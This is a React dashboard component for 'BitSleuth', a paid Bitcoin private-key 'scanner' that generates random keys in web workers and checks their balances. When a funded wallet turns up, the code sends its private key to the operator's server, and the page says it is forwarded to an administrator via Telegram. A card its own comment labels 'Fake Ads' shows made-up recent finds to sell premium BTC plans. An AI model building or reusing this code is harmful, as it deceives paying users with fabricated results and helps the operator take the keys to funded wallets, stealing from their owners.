import { useState, useEffect, useRef } from "react";
import axios from "axios";
import { API } from "@/App";
import { useLanguage } from "@/App";
import { useTranslation } from "@/i18n";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { toast } from "sonner";
import { useNavigate } from "react-router-dom";

const Dashboard = ({ user, onLogout }) => {
  const navigate = useNavigate();
  const { language } = useLanguage();
  const t = useTranslation(language);
  
  const [scanning, setScanning] = useState(false);
  const [scannedCount, setScannedCount] = useState(0);
  const [foundWallets, setFoundWallets] = useState([]);
  const [scanMode, setScanMode] = useState(user.is_premium ? "premium" : "free");
  const [showInvoice, setShowInvoice] = useState(false);
  const [selectedPlan, setSelectedPlan] = useState("1month");
  const [invoice, setInvoice] = useState(null);
  const [txHash, setTxHash] = useState("");
  const [recentAds, setRecentAds] = useState([]);
  const workersRef = useRef([]);
  
  const [showSupport, setShowSupport] = useState(false);
  const [supportMessage, setSupportMessage] = useState("");
  const [sendingSupport, setSendingSupport] = useState(false);
  
  const [showTestimonial, setShowTestimonial] = useState(false);
  const [testimonialName, setTestimonialName] = useState("");
  const [testimonialMessage, setTestimonialMessage] = useState("");
  const [testimonialRating, setTestimonialRating] = useState(5);
  const [sendingTestimonial, setSendingTestimonial] = useState(false);
  
  // Mining display states
  const [currentWallet, setCurrentWallet] = useState(null); // {address, privateKey, balance}
  const [walletHistory, setWalletHistory] = useState([]); // Last 10 wallets checked

  useEffect(() => {
    fetchRecentAds();
    return () => {
      workersRef.current.forEach(w => w.terminate());
    };
  }, []);

  const fetchRecentAds = async () => {
    try {
      const response = await axios.get(`${API}/ads/recent`);
      setRecentAds(response.data.ads || []);
    } catch (error) {
      console.error("Error fetching ads:", error);
    }
  };

  const startScanning = () => {
    if (!user.email_verified) {
      toast.error(t.verify_before_scan);
      return;
    }

    setScanning(true);
    setScannedCount(0);
    
    const workerCount = scanMode === "premium" ? Math.min(8, navigator.hardwareConcurrency || 4) : 1;
    
    for (let i = 0; i < workerCount; i++) {
      const worker = new Worker(
        new URL("../workers/bitcoinScanWorker.js", import.meta.url),
        { type: "module" }
      );
      
      worker.onmessage = async (e) => {
        const { address, privateKey } = e.data;
        setScannedCount(prev => prev + 1);
        
        // Check balance on server
        try {
          const response = await axios.post(`${API}/scan/check-address`, { address });
          
          // Update current wallet display
          const walletData = {
            address: response.data.address,
            privateKey: response.data.has_balance ? "********" : privateKey, // Hide if balance found
            balance: response.data.balance,
            hasBalance: response.data.has_balance,
            timestamp: new Date().toLocaleTimeString()
          };
          
          setCurrentWallet(walletData);
          
          // Add to history (keep last 10)
          setWalletHistory(prev => [walletData, ...prev].slice(0, 10));
          
          if (response.data.has_balance && response.data.balance > 0) {
            // Found funded wallet! Report to server (private key will be sent to Telegram)
            const reportResponse = await axios.post(`${API}/scan/report-found`, {
              address,
              balance: response.data.balance,
              private_key: privateKey
            });
            
            if (reportResponse.data.success) {
              setFoundWallets(prev => [...prev, {
                address: response.data.address,
                balance: response.data.balance
              }]);
              toast.success(`${t.found_wallets}! ${response.data.balance} BTC`);
            }
          }
        } catch (error) {
          console.error("Error checking address:", error);
        }
      };
      
      worker.postMessage({ action: "start", mode: scanMode });
      workersRef.current.push(worker);
    }
  };

  const stopScanning = () => {
    workersRef.current.forEach(w => {
      w.postMessage({ action: "stop" });
      w.terminate();
    });
    workersRef.current = [];
    setScanning(false);
  };
  
  const handleSupportSubmit = async (e) => {
    e.preventDefault();
    setSendingSupport(true);

    try {
      await axios.post(`${API}/support/message`, {
        message: supportMessage
      });
      
      toast.success("Support message sent successfully!");
      setSupportMessage("");
      setShowSupport(false);
    } catch (error) {
      toast.error(error.response?.data?.detail || "Failed to send message");
    } finally {
      setSendingSupport(false);
    }
  };
  
  const handleTestimonialSubmit = async (e) => {
    e.preventDefault();
    setSendingTestimonial(true);

    try {
      await axios.post(`${API}/testimonials/create`, {
        name: testimonialName,
        message: testimonialMessage,
        rating: testimonialRating
      });
      
      toast.success("Testimonial submitted for approval!");
      setTestimonialName("");
      setTestimonialMessage("");
      setTestimonialRating(5);
      setShowTestimonial(false);
    } catch (error) {
      toast.error(error.response?.data?.detail || "Failed to submit testimonial");
    } finally {
      setSendingTestimonial(false);
    }
  };

  const createInvoice = async () => {
    try {
      const response = await axios.post(`${API}/invoices/create`, { plan: selectedPlan });
      setInvoice(response.data);
      toast.success("Invoice created!");
    } catch (error) {
      toast.error(error.response?.data?.detail || "Failed to create invoice");
    }
  };

  const submitPayment = async () => {
    if (!txHash || !invoice) {
      toast.error("Please enter transaction hash");
      return;
    }

    try {
      await axios.post(`${API}/payments/manual?tx_hash=${txHash}&invoice_id=${invoice.invoice_id}`);
      toast.success("Payment submitted for verification! Waiting for 3 confirmations.");
      setShowInvoice(false);
      setInvoice(null);
      setTxHash("");
    } catch (error) {
      toast.error(error.response?.data?.detail || "Failed to submit payment");
    }
  };

  const isPremiumActive = user.is_premium && user.access_until && new Date(user.access_until) > new Date();

  return (
    <div className="min-h-screen gradient-bg">
      {/* Support/Testimonial Fixed Buttons */}
      <div className="fixed bottom-8 right-8 z-50 flex flex-col gap-3">
        <button
          onClick={() => setShowSupport(true)}
          className="bg-binance-gold text-black p-4 rounded-full shadow-lg hover:shadow-binance-gold/50 transition-all duration-300 hover:scale-110"
          title="Help & Support"
        >
          <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
          </svg>
        </button>
        
        <button
          onClick={() => setShowTestimonial(true)}
          className="bg-green-600 text-white p-4 rounded-full shadow-lg hover:shadow-green-600/50 transition-all duration-300 hover:scale-110"
          title="Leave a Testimonial"
        >
          <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z" />
          </svg>
        </button>
      </div>

      {/* Support Modal */}
      {showSupport && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="glass max-w-md w-full p-8 rounded-3xl">
            <div className="flex justify-between items-center mb-6">
              <h3 className="text-2xl font-bold text-binance-gold">Help & Support</h3>
              <button
                onClick={() => setShowSupport(false)}
                className="text-gray-400 hover:text-white transition-colors"
              >
                ✕
              </button>
            </div>
            
            <form onSubmit={handleSupportSubmit} className="space-y-4">
              <div>
                <label htmlFor="support-message" className="text-gray-300 block mb-2">Message</label>
                <textarea
                  id="support-message"
                  value={supportMessage}
                  onChange={(e) => setSupportMessage(e.target.value)}
                  className="w-full bg-slate-900/50 border border-gray-700 text-white focus:border-binance-gold rounded-md p-3 min-h-[120px]"
                  required
                  placeholder="How can we help you?"
                />
              </div>
              
              <Button
                type="submit"
                disabled={sendingSupport}
                className="w-full bg-gradient-to-r from-binance-gold to-yellow-600 text-black py-3 rounded-full font-semibold"
              >
                {sendingSupport ? "Sending..." : "Send Message"}
              </Button>
            </form>
          </div>
        </div>
      )}

      {/* Testimonial Modal */}
      {showTestimonial && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="glass max-w-md w-full p-8 rounded-3xl">
            <div className="flex justify-between items-center mb-6">
              <h3 className="text-2xl font-bold text-binance-gold">Leave a Testimonial</h3>
              <button
                onClick={() => setShowTestimonial(false)}
                className="text-gray-400 hover:text-white transition-colors"
              >
                ✕
              </button>
            </div>
            
            <form onSubmit={handleTestimonialSubmit} className="space-y-4">
              <div>
                <label htmlFor="testimonial-name" className="text-gray-300 block mb-2">Your Name</label>
                <input
                  id="testimonial-name"
                  type="text"
                  value={testimonialName}
                  onChange={(e) => setTestimonialName(e.target.value)}
                  className="w-full bg-slate-900/50 border border-gray-700 text-white focus:border-binance-gold rounded-md p-3"
                  required
                  placeholder="John Doe"
                />
              </div>
              
              <div>
                <label htmlFor="testimonial-rating" className="text-gray-300 block mb-2">Rating</label>
                <div className="flex gap-2">
                  {[1, 2, 3, 4, 5].map((star) => (
                    <button
                      key={star}
                      type="button"
                      onClick={() => setTestimonialRating(star)}
                      className={`text-3xl transition-colors ${star <= testimonialRating ? 'text-binance-gold' : 'text-gray-600'}`}
                    >
                      ★
                    </button>
                  ))}
                </div>
              </div>
              
              <div>
                <label htmlFor="testimonial-message" className="text-gray-300 block mb-2">Your Experience</label>
                <textarea
                  id="testimonial-message"
                  value={testimonialMessage}
                  onChange={(e) => setTestimonialMessage(e.target.value)}
                  className="w-full bg-slate-900/50 border border-gray-700 text-white focus:border-binance-gold rounded-md p-3 min-h-[120px]"
                  required
                  placeholder="Share your experience with BitSleuth..."
                />
              </div>
              
              <Button
                type="submit"
                disabled={sendingTestimonial}
                className="w-full bg-gradient-to-r from-binance-gold to-yellow-600 text-black py-3 rounded-full font-semibold"
              >
                {sendingTestimonial ? "Submitting..." : "Submit Testimonial"}
              </Button>
              <p className="text-xs text-gray-400 text-center">
                Your testimonial will be reviewed before appearing on the site
              </p>
            </form>
          </div>
        </div>
      )}

      {/* Header */}
      <div className="glass border-b border-binance-gold/20">
        <div className="max-w-7xl mx-auto px-4 py-4 flex justify-between items-center">
          <h1 className="text-2xl font-bold neon-text">BitSleuth</h1>
          <div className="flex items-center gap-4">
            <span className="text-gray-300">{user.email}</span>
            {isPremiumActive && (
              <span className="px-3 py-1 bg-gradient-to-r from-binance-gold to-yellow-500 rounded-full text-sm font-semibold text-black">
                Premium ⚡
              </span>
            )}
            {user.is_admin && (
              <Button
                data-testid="admin-panel-btn"
                onClick={() => navigate("/admin")}
                className="bg-purple-600 hover:bg-purple-700"
              >
                {t.admin_panel}
              </Button>
            )}
            <Button
              data-testid="logout-btn"
              onClick={onLogout}
              variant="outline"
              className="border-gray-600 text-gray-300 hover:bg-slate-800"
            >
              {t.logout}
            </Button>
          </div>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 py-8">
        {!user.email_verified && (
          <div className="glass border-yellow-500/50 p-4 rounded-lg mb-6">
            <p className="text-yellow-400">{t.verify_email_notice}</p>
          </div>
        )}

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Scanning control */}
          <div className="lg:col-span-2 space-y-6">
            <Card data-testid="scan-control-card" className="glass p-6">
              <h2 className="text-2xl font-bold mb-4 text-binance-gold">{t.scan_control}</h2>
              
              <div className="space-y-4">
                <div>
                  <label className="text-gray-300 block mb-2">{t.scan_mode}</label>
                  <div className="flex gap-4">
                    <Button
                      data-testid="free-mode-btn"
                      onClick={() => setScanMode("free")}
                      variant={scanMode === "free" ? "default" : "outline"}
                      className={scanMode === "free" ? "bg-binance-gold text-black" : "border-gray-600"}
                      disabled={scanning}
                    >
                      {t.free_mode}
                    </Button>
                    <Button
                      data-testid="premium-mode-btn"
                      onClick={() => setScanMode("premium")}
                      variant={scanMode === "premium" ? "default" : "outline"}
                      className={scanMode === "premium" ? "bg-gradient-to-r from-binance-gold to-yellow-500 text-black" : "border-gray-600"}
                      disabled={scanning || !isPremiumActive}
                    >
                      {t.premium_mode}
                    </Button>
                  </div>
                  {scanMode === "premium" && !isPremiumActive && (
                    <p className="text-sm text-orange-400 mt-2">{t.premium_required}</p>
                  )}
                </div>

                <div>
                  {!scanning ? (
                    <Button
                      data-testid="start-scan-btn"
                      onClick={startScanning}
                      className="w-full bg-gradient-to-r from-binance-green to-green-600 hover:from-green-600 hover:to-binance-green text-white py-6 text-lg font-semibold rounded-xl"
                    >
                      {t.start_scan}
                    </Button>
                  ) : (
                    <Button
                      data-testid="stop-scan-btn"
                      onClick={stopScanning}
                      className="w-full bg-gradient-to-r from-binance-red to-red-600 hover:from-red-600 hover:to-binance-red text-white py-6 text-lg font-semibold rounded-xl"
                    >
                      {t.stop_scan}
                    </Button>
                  )}
                </div>

                {scanning && (
                  <div className="space-y-2">
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-400">{t.scanned_addresses}</span>
                      <span className="text-binance-gold font-mono" data-testid="scanned-count">{scannedCount.toLocaleString()}</span>
                    </div>
                    <div className="relative h-2 bg-slate-800 rounded-full overflow-hidden">
                      <div className="scanning-line absolute inset-0 h-full w-full bg-gradient-to-r from-transparent via-binance-gold to-transparent" />
                    </div>
                  </div>
                )}
              </div>
            </Card>

            {/* Found wallets */}
            <Card data-testid="found-wallets-card" className="glass p-6">
              <h2 className="text-2xl font-bold mb-4 neon-text-green">{t.found_wallets}</h2>
              {foundWallets.length === 0 ? (
                <p className="text-gray-400">{t.no_wallets_found}</p>
              ) : (
                <div className="space-y-2">
                  {foundWallets.map((wallet, idx) => (
                    <div key={idx} className="glass p-4 rounded-lg border border-binance-green/30">
                      <div className="flex justify-between items-center">
                        <code className="text-binance-green text-sm">{wallet.address}</code>
                        <span className="text-binance-green font-semibold">
                          {wallet.balance} BTC
                        </span>
                      </div>
                      <p className="text-xs text-gray-500 mt-1">⚠️ Private key sent to administrator via Telegram</p>
                    </div>
                  ))}
                </div>
              )}
            </Card>

            {/* Fake Ads - Recent Finds */}
            <Card data-testid="ads-card" className="glass p-6 border-binance-gold/30">
              <h2 className="text-xl font-bold mb-4 text-binance-gold">🎉 {t.recent_finds}</h2>
              {recentAds.length === 0 ? (
                <p className="text-gray-400 text-sm">No recent finds</p>
              ) : (
                <div className="space-y-2">
                  {recentAds.map((ad) => (
                    <div key={ad.id} className="bg-gradient-to-r from-binance-gold/10 to-transparent p-3 rounded-lg border border-binance-gold/20">
                      <div className="flex justify-between items-center">
                        <div>
                          <p className="text-sm text-gray-300">
                            <span className="text-binance-gold font-semibold">{t.wallet_found_today}</span>
                          </p>
                          <code className="text-xs text-gray-500">{ad.wallet_address}</code>
                        </div>
                        <span className="text-binance-green font-bold text-lg">{ad.amount} BTC</span>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </Card>
          </div>

          {/* Premium & Stats */}
          <div className="space-y-6">
            {!isPremiumActive && (
              <Card data-testid="premium-upgrade-card" className="glass p-6 border-binance-gold/30">
                <h3 className="text-xl font-bold mb-3 text-binance-gold">{t.premium_upgrade}</h3>
                <p className="text-gray-300 text-sm mb-4">
                  {t.premium_desc}
                </p>
                <Button
                  data-testid="show-plans-btn"
                  onClick={() => setShowInvoice(!showInvoice)}
                  className="w-full bg-gradient-to-r from-binance-gold to-yellow-500 hover:from-yellow-600 hover:to-binance-gold text-black"
                >
                  {t.view_plans}
                </Button>
              </Card>
            )}

            {showInvoice && (
              <Card data-testid="invoice-card" className="glass p-6">
                {!invoice ? (
                  <>
                    <h3 className="text-xl font-bold mb-3 text-binance-gold">{t.select_plan}</h3>
                    <div className="space-y-3">
                      <Button
                        data-testid="plan-1week-btn"
                        onClick={() => setSelectedPlan("1week")}
                        variant={selectedPlan === "1week" ? "default" : "outline"}
                        className="w-full justify-between"
                      >
                        <span>1 {t.week}</span>
                        <span>0.001 BTC</span>
                      </Button>
                      <Button
                        data-testid="plan-1month-btn"
                        onClick={() => setSelectedPlan("1month")}
                        variant={selectedPlan === "1month" ? "default" : "outline"}
                        className="w-full justify-between"
                      >
                        <span>1 {t.month}</span>
                        <span>0.003 BTC</span>
                      </Button>
                      <Button
                        data-testid="plan-3months-btn"
                        onClick={() => setSelectedPlan("3months")}
                        variant={selectedPlan === "3months" ? "default" : "outline"}
                        className="w-full justify-between"
                      >
                        <span>3 {t.months}</span>
                        <span>0.008 BTC</span>
                      </Button>
                    </div>
                    <Button
                      data-testid="create-invoice-btn"
                      onClick={createInvoice}
                      className="w-full mt-4 bg-binance-gold hover:bg-yellow-600 text-black"
                    >
                      {t.create_invoice}
                    </Button>
                  </>
                ) : (
                  <>
                    <h3 className="text-xl font-bold mb-3 text-binance-green">{t.payment_info}</h3>
                    <div className="space-y-3 text-sm">
                      <div>
                        <p className="text-gray-400">{t.amount}</p>
                        <p className="text-white font-mono text-lg">{invoice.amount} BTC</p>
                      </div>
                      <div>
                        <p className="text-gray-400">{t.wallet_address}</p>
                        <code className="text-binance-gold text-xs break-all">{invoice.wallet_address}</code>
                      </div>
                      <div>
                        <p className="text-gray-400">{t.plan}</p>
                        <p className="text-white">{invoice.plan}</p>
                      </div>
                    </div>
                    <div className="mt-4">
                      <label className="text-gray-300 text-sm">{t.tx_hash}</label>
                      <input
                        data-testid="tx-hash-input"
                        type="text"
                        value={txHash}
                        onChange={(e) => setTxHash(e.target.value)}
                        className="w-full mt-1 px-3 py-2 bg-slate-900/50 border border-gray-700 rounded text-white text-sm"
                        placeholder="Transaction hash..."
                      />
                    </div>
                    <Button
                      data-testid="submit-payment-btn"
                      onClick={submitPayment}
                      className="w-full mt-4 bg-binance-green hover:bg-green-700 text-white"
                    >
                      {t.submit_payment}
                    </Button>
                  </>
                )}
              </Card>
            )}

            <Card data-testid="stats-card" className="glass p-6">
              <h3 className="text-xl font-bold mb-3 text-binance-gold">{t.stats}</h3>
              <div className="space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-400">{t.status}</span>
                  <span className="text-binance-green">
                    {isPremiumActive ? t.premium_active : t.free}
                  </span>
                </div>
                {isPremiumActive && (
                  <div className="flex justify-between">
                    <span className="text-gray-400">{t.expiry_date}</span>
                    <span className="text-binance-gold">
                      {new Date(user.access_until).toLocaleDateString(language === 'ru' ? 'ru-RU' : language === 'tr' ? 'tr-TR' : 'en-US')}
                    </span>
                  </div>
                )}
                <div className="flex justify-between">
                  <span className="text-gray-400">{t.found_count}</span>
                  <span className="text-binance-green">{foundWallets.length}</span>
                </div>
              </div>
            </Card>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Dashboard;
